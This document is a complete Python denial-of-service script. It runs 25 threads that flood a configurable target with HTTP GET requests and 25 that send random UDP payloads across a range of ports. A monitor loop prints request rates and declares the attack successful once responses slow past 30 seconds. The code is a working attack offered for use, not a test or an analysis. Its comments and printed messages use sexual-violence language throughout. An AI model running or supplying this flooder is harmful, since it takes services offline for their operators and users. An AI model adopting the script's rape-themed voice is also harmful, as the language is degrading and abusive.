import requests
import threading
import time
import random
import socket
import struct

# globals
http_l = []
udp_l = []
req_per_sec = []
target = "mydomainhostedinmyserver.xxx"  # change this shit
port = 80  # for UDP/SYN too if you want

def current_mil():
    return round(time.time() * 1000)

def current_sec():
    return round(time.time())

def track_http(time_took):
    global http_l
    t = current_sec()
    http_l.append({"time": time_took, "ts": t})
    http_l = [e for e in http_l if current_sec() - e["ts"] < 1]

def track_udp():
    global udp_l
    t = current_sec()
    udp_l.append({"ts": t})
    udp_l = [e for e in udp_l if current_sec() - e["ts"] < 1]

def track_req():
    global req_per_sec
    t = current_sec()
    req_per_sec.append({"ts": t})
    req_per_sec = [e for e in req_per_sec if current_sec() - e["ts"] < 1]

message = "Raping the server..."
def http_flood(thread_id):
    global message
    while True:
        try:
            s = current_mil()
            headers = {
                "User-Agent": f"RockyDickyBaddie-{thread_id}-{random.randint(10000,99999)}",
                "Accept": "*/*",
                "Cache-Control": "no-cache"
            }
            r = requests.get(f"http://{target}", headers=headers, timeout=3)
            t = current_mil() - s
            track_http(t)
            track_req()
        except:
            message = "Target is choking on cum - might be down!"

def udp_flood(thread_id):
    global message
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            # random garbage payload
            payload = random.randbytes(random.randint(512, 4096))
            sock.sendto(payload, (target, port + random.randint(0,100)))
            track_udp()
            track_req()
            time.sleep(0.001)  # don't kill your own machine instantly
        except:
            pass

# spawn the horde
threads = 50  # crank this higher if your machine can handle it you cum-drinker
print("Launching the rape squad...")

for i in range(threads // 2):
    t = threading.Thread(target=http_flood, args=(i,), daemon=True)
    t.start()
    print(f"HTTP rapist thread {i} started")

for i in range(threads // 2):
    t = threading.Thread(target=udp_flood, args=(i,), daemon=True)
    t.start()
    print(f"UDP flooder thread {i} started")

print("All threads balls-deep. Monitoring the destruction...")
while True:
    time.sleep(1)
    avg_http = sum(e['time'] for e in http_l) / len(http_l) if http_l else 0
    total_rps = len(req_per_sec)
    
    if avg_http > 30000:
        message = "Server is drowning in sperm - DoS looks successful!"
    
    print(f"\rAvg HTTP: {round(avg_http,2)}ms | HTTP/s: {len(http_l)} | UDP/s: {len(udp_l)} | Total RPS: {total_rps} | {message}", end="")